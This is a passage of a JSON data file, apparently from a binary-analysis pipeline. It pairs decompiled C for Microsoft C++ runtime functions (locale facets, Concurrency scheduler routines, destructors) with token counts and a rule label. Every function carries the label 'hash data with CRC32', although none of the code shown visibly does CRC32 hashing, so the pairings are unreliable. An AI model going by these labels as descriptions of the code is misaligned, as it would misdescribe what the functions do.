        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00435e9b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = vtable.std::messages_char_.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 476
    },
    "00435f18": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00435f18(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::money_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 494
    },
    "00435f95": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00435f95(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::money_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 494
    },
    "00436012": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00436012(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x58, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::_Mpunct_char_.0;\n            *(ppcVar3 + 10) = 1;\n            fcn.00436f22(uVar5, 1);\n            *ppcVar3 = vtable.std::moneypunct_char__1_.0;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 560
    },
    "004360ab": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004360ab(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x58, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::_Mpunct_char_.0;\n            *(ppcVar3 + 10) = 0;\n            fcn.00436f22(uVar5, 1);\n            *ppcVar3 = vtable.std::moneypunct_char__0_.0;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 560
    },
    "00436145": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00436145(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0x44, uVar5);\n        *(unaff_EBP + -0x14) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x10) = 1;\n            iVar4 = fcn.00435cd3(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "004361c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004361c6(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0xc, uVar5);\n        *(unaff_EBP + -0x10) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            iVar4 = fcn.00435d06(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 418
    },
    "0044586f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044586f(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.0043ac97(*(in_ECX + 0xc));\n    fcn.0043ac97(*(in_ECX + 8));\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "004461a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004461a4(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    bool bVar7;\n    uint var_4h;\n    \n    puVar1 = param_1 + 0x6c;\n    uVar3 = *puVar1;\n    *puVar1 = 0xffffffff;\n    puVar6 = *(param_1 + 0x34);\n    uVar5 = (-(*(param_1 + 0x74) != 0) & 0xfffffc1a) - 1;\n    while( true ) {\n        if ((puVar6 == NULL) || (puVar6 == *(param_1 + 0x30))) goto code_r0x0044620f;\n        uVar3 = puVar6[1] >> 0x1c;\n        if ((uVar3 & 1) == 0) {\n            uVar3 = fcn.0044709c();\n            uVar2 = uVar3;\n        }\n        else {\n            uVar2 = *(puVar6 + 6) & 3;\n        }\n        if (uVar2 != 0) break;\n        uVar3 = puVar6[1] & 0xfffffff;\n        if (uVar3 == 0xfffffff) {\n            puVar6 = NULL;\n        }\n        else {\n            puVar6 = *puVar6;\n        }\n    }\n    uVar5 = (puVar6[1] << 4) >> 4;\ncode_r0x0044620f:\n    uVar4 = 0xffffffff;\n    do {\n        if ((uVar4 != 0xffffffff) && (uVar5 < uVar4)) {\n            return uVar3;\n        }\n        LOCK();\n        if (uVar4 == *puVar1) {\n            *puVar1 = uVar5;\n            uVar3 = uVar4;\n        }\n        else {\n            uVar3 = *puVar1;\n        }\n        bVar7 = uVar3 != uVar4;\n        uVar4 = uVar3;\n    } while (bVar7);\n    return uVar3;\n}\n",
        "token_count": 513
    },
    "0044683e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044683e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47313c;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    cVar3 = '\\0';\n    if ((*(param_1 + 100) == param_1) || ((*(param_1 + 0x78) & 1) != 0)) {\n        cVar3 = fcn.004472cb(0);\n        cVar3 = '\\x01' - (cVar3 != '\\0');\n        if (*(param_1 + 100) == param_1) {\n            iVar1 = *(param_1 + 0x68);\n            while (iVar1 != 0) {\n                iVar1 = *(iVar1 + 0x68);\n                fcn.00447143();\n            }\n        }\n    }\n    if (*(param_1 + 0x6c) != 0) {\n        fcn.00446954(1);\n    }\n    uVar4 = *(param_1 + 0x18) & 0xfffffffc;\n    if ((uVar4 != 0) && (uVar4 != 0xc)) {\n        fcn.00446980(1);\n    }\n    if ((*(param_1 + 8) != 0) && (*(param_1 + 8) != 2)) {\n        fcn.00412d90();\n    }\n    if (cVar3 != '\\0') {\n        fcn.00445557();\n        fcn.00451487(&var_18h, 0x48e5c4);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    fcn.0043b7f5();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 477
    },
    "00446954": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446954(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 8) != 0) {\n        fcn.0043ac97(*(in_ECX + 8));\n    }\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00446a38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446a38(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t arg_8h_00;\n    int32_t in_ECX;\n    uint arg_8h_01;\n    int32_t iVar6;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar4 = fcn.00442d5d();\n    iVar2 = *(in_ECX + 0x6c);\n    if ((*(in_ECX + 100) == in_ECX) || ((*(in_ECX + 0x78) & 1) == 0)) {\n        bVar3 = false;\n    }\n    else {\n        bVar3 = true;\n    }\n    if (bVar3) {\n        iVar6 = 0;\n    }\n    else {\n        iVar6 = *(*(in_ECX + 100) + 0x68);\n    }\n    if ((iVar2 == 0) || (*(iVar2 + 0xc) == '\\0')) {\n        uVar5 = *(in_ECX + 0x84);\n        while (0 < uVar5) {\n            if (uVar5 < 3) {\n                arg_8h_01 = *(in_ECX + 0x6c + uVar5 * 4);\n            }\n            else {\n                *(iVar2 + 4) = *(iVar2 + 4) + -1;\n                arg_8h_01 = *(*(iVar2 + 8) + *(iVar2 + 4) * 4);\n                uVar5 = *(in_ECX + 0x84);\n            }\n            *(in_ECX + 0x84) = uVar5 - 1;\n            arg_8h_00 = fcn.0044669f(arg_8h_01);\n            if (arg_8h_00 == 0) break;\n            if (arg_8h_00 != 1) {\n                if (*(iVar4 + 0x4c) == '\\0') {\n                    piVar1 = *(iVar4 + 0x9c) + 0x6c;\n                    *piVar1 = *piVar1 + 1;\n                }\n                else {\n                    piVar1 = *(iVar4 + 0x9c) + 0xc;\n                    *piVar1 = *piVar1 + 1;\n                }\n                *(arg_8h_00 + 8) = 0;\n                fcn.004470af(arg_8h_00);\n            }\n            uVar5 = *(in_ECX + 0x84);\n        }\n    }\n    else {\n        fcn.00446b88(iVar4);\n        *(iVar2 + 0xc) = 0;\n    }\n    do {\n        iVar4 = iVar6;\n        if ((arg_8h == '\\0') && (*(in_ECX + 0x10) < 1)) {\n            if ((*(in_ECX + 100) == in_ECX) || ((*(in_ECX + 0x78) & 1) != 0)) {\n                bVar3 = false;\n            }\n            else {\n                bVar3 = true;\n            }\n            if ((bVar3) || (iVar4 != 0)) goto code_r0x00446b24;\n        }\n        else {\ncode_r0x00446b24:\n            fcn.00446d06(0, iVar4);\n        }\n        fcn.00446f58(iVar4);\n        if ((*(in_ECX + 100) == in_ECX) || ((*(in_ECX + 0x78) & 1) == 0)) {\n            bVar3 = false;\n        }\n        else {\n            bVar3 = true;\n        }\n        if (bVar3) {\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = *(*(in_ECX + 100) + 0x68);\n        }\n        if (iVar4 == iVar6) {\n            *(in_ECX + 0x84) = 0;\n            if (iVar2 != 0) {\n                *(iVar2 + 4) = 0;\n            }\n            if (arg_8h == '\\0') {\n                fcn.0044717d(iVar4);\n            }\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 978
    },
    "00446d06": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446d06(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint arg_8h_00;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar4 = fcn.00446bd2();\n    cVar3 = fcn.00447278(1);\n    if (cVar3 != '\\0') {\n        if ((*(iVar4 + 100) == iVar4) || ((*(iVar4 + 0x78) & 1) == 0)) {\n            bVar2 = false;\n        }\n        else {\n            bVar2 = true;\n        }\n        if ((bVar2) || (iVar4 == in_ECX)) {\n            piVar1 = in_ECX + 0x38;\n            do {\n                while ((iVar4 = *piVar1,  iVar4 == 1 || (iVar4 == 5))) {\n                    arg_8h_00 = *(in_ECX + 0xc);\n                    fcn.00445a8f((*(in_ECX + 4) << 4) >> 4);\n                    if (iVar4 == 5) {\n                        fcn.00446b88(arg_8h_00);\n                    }\n                    *piVar1 = 4;\n                }\n                iVar5 = 0;\n                LOCK();\n                if (*piVar1 == 0) {\n                    *piVar1 = 3;\n                }\n                else {\n                    iVar5 = *piVar1;\n                }\n            } while (iVar5 != iVar4);\n            fcn.00446e76(arg_8h, 1);\n        }\n        else {\n            fcn.00446dd1(arg_8h);\n        }\n        fcn.00446db2(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 429
    },
    "0044717d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044717d(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    bool bVar6;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \ncode_r0x0044718b:\n    iVar3 = fcn.00442d5d();\n    iVar2 = *(in_ECX + 0xc);\n    piVar1 = in_ECX + 0x38;\n    do {\n        iVar5 = *piVar1;\ncode_r0x0044719e:\n        while (iVar5 != 9) {\n            if (iVar3 != iVar2) goto code_r0x0044720f;\n            LOCK();\n            if (iVar5 == *piVar1) {\n                *piVar1 = 0;\n                iVar4 = iVar5;\n            }\n            else {\n                iVar4 = *piVar1;\n            }\n            bVar6 = iVar4 == iVar5;\n            iVar5 = iVar4;\n            if (bVar6) {\n                if (iVar4 == 4) {\n                    fcn.00445af6((*(in_ECX + 4) << 4) >> 4);\n                }\n                *(in_ECX + 4) = *(in_ECX + 4) | 0xfffffff;\n                goto code_r0x004471f5;\n            }\n        }\n        iVar5 = *piVar1;\n        while (iVar5 == 9) {\n            fcn.0043bebc();\n            iVar5 = *piVar1;\n        }\n    } while( true );\ncode_r0x0044720f:\n    iVar5 = 3;\n    LOCK();\n    if (*piVar1 == 3) {\n        *piVar1 = 0;\n    }\n    else {\n        iVar5 = *piVar1;\n    }\n    if (iVar5 != 9) {\ncode_r0x004471f5:\n        if (*(in_ECX + 100) == in_ECX) {\n            for (; arg_8h != 0; arg_8h = *(arg_8h + 0x68)) {\n                if ((*(arg_8h + 0x78) >> 1 & 1) == 0) {\n                    fcn.0044717d(0);\n                }\n            }\n            iVar2 = *(in_ECX + 0x34);\n            *(in_ECX + 0x34) = 0;\n            if (iVar2 < 0) {\n                while (*(in_ECX + 0x18) == 8) {\n                    fcn.0043bebc();\n                }\n                fcn.0044e592();\n            }\n            return;\n        }\n        if (((*(in_ECX + 0x78) ^ 0xff) & 1) == 0) {\n            return;\n        }\n        if (arg_8h == 0) {\n            return;\n        }\n        in_ECX = *(in_ECX + 100);\n        goto code_r0x0044718b;\n    }\n    goto code_r0x0044719e;\n}\n",
        "token_count": 748
    },
    "004472cb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004472cb(uint arg_8h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    bool bVar3;\n    \n    bVar1 = false;\n    if ((*(in_ECX + 100) == in_ECX) || (uVar2 = *(in_ECX + 0x78),  (uVar2 & 1) != 0)) {\n        uVar2 = fcn.00453e69();\n        if (uVar2 == '\\0') {\n            bVar1 = 0 < *(in_ECX + 0x10);\n            if (*(in_ECX + 100) == in_ECX) {\n                for (uVar2 = *(in_ECX + 0x68); uVar2 != 0; uVar2 = *(uVar2 + 0x68)) {\n                    if (0 < *(uVar2 + 0x10)) {\n                        bVar1 = true;\n                    }\n                }\n            }\n            bVar3 = !bVar1;\n            if (bVar3) goto code_r0x00447319;\n        }\n        uVar2 = fcn.00446a38(arg_8h);\n    }\n    bVar3 = !bVar1;\ncode_r0x00447319:\n    return uVar2 & 0xffffff00 | bVar3;\n}\n",
        "token_count": 308
    },
    "00447c07": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00447c07(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_8h_00;\n    float10 fVar6;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x800);\n    iVar1 = fcn.004400b0();\n    uVar4 = iVar1 + *(iVar3 + 0xb8);\n    uVar2 = fcn.0043e381();\n    arg_8h_00 = *(in_ECX + 0x814);\n    uVar5 = *(in_ECX + 0x810);\n    if (uVar5 + arg_8h_00 < arg_8h) {\n        arg_8h = uVar5 + arg_8h_00;\n    }\n    if ((uVar5 < arg_8h_00) && (arg_8h < arg_8h_00 - uVar5)) {\n        arg_8h = arg_8h_00 - uVar5;\n    }\n    if (arg_8h == arg_8h_00) {\n        if (uVar4 < arg_8h) {\n            arg_8h = arg_8h - 1;\n        }\n        else {\n            arg_8h = arg_8h + 1;\n        }\n    }\n    if (arg_8h < uVar4) {\n        arg_8h = uVar4;\n    }\n    if (uVar2 < arg_8h) {\n        arg_8h = uVar2;\n    }\n    uVar5 = arg_8h;\n    if (((arg_8h != arg_8h_00) && (arg_8h != arg_8h_00)) && (arg_8h == arg_8h_00)) {\n        do {\n            uVar5 = arg_8h_00;\n            arg_8h_00 = uVar5 - 1;\n            if (arg_8h_00 != arg_8h) {\n                if (arg_8h == arg_8h_00) {\n                    return arg_8h;\n                }\n                if (arg_8h != arg_8h_00) {\n                    return arg_8h;\n                }\n            }\n            iVar3 = fcn.00447b93(arg_8h_00);\n        } while ((*(iVar3 + 0x10) < 1) || (fVar6 = fcn.004479d9(*(in_ECX + 0x814), arg_8h_00),  0 < fVar6 * *0x478790));\n    }\n    return uVar5;\n}\n",
        "token_count": 630
    },
    "0044a228": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044a228(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint32_t uVar4;\n    \n    iVar2 = *(param_1 + 4);\n    uVar4 = iVar2 - 1;\n    *(param_1 + 4) = uVar4;\n    puVar1 = *(param_1 + 0xc) + (*(param_1 + 8) & uVar4) * 4;\n    uVar4 = *puVar1;\n    *puVar1 = 0;\n    if (uVar4 == 0) {\n        *(param_1 + 4) = iVar2;\n    }\n    if ((uVar4 & 1) != 0) {\n        uVar4 = uVar4 & 0xfffffffe;\n        cVar3 = fcn.00445c22(0);\n        if (cVar3 == '\\0') {\n            uVar4 = 1;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 240
    },
    "0044acda": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044acda(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint32_t *in_ECX;\n    uint32_t uVar4;\n    \n    while( true ) {\n        if ((in_ECX[1] <= *in_ECX) ||\n           (((uVar2 = *in_ECX,  (*(in_ECX[3] + (in_ECX[2] & uVar2) * 4) & 1) != 0 && (arg_8h == '\\0')) &&\n            (cVar3 = fcn.0044ab04(),  cVar3 != '\\0')))) {\n            return 0;\n        }\n        puVar1 = in_ECX[3] + (uVar2 & in_ECX[2]) * 4;\n        uVar4 = *puVar1;\n        *puVar1 = 0;\n        if ((uVar4 & 1) == 0) break;\n        uVar4 = uVar4 & 0xfffffffe;\n        cVar3 = fcn.00445c22(0);\n        if (cVar3 != '\\0') break;\n        *in_ECX = uVar2 + 1;\n    }\n    if (uVar4 == 0) {\n        return 0;\n    }\n    *in_ECX = uVar2 + 1;\n    return uVar4;\n}\n",
        "token_count": 324
    },
    "0044b088": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b088(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.0044affa();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0044e2f9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e2f9(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.Concurrency::details::ThreadInternalContext.0;\n    in_ECX[1] = vtable.Concurrency::details::ThreadInternalContext.1.0;\n    fcn.0044affa();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "0044e32b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e32b(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.Concurrency::details::ThreadScheduler.0;\n    in_ECX[2] = vtable.Concurrency::details::ThreadScheduler.1.0;\n    fcn.00441f97();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00453eb3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
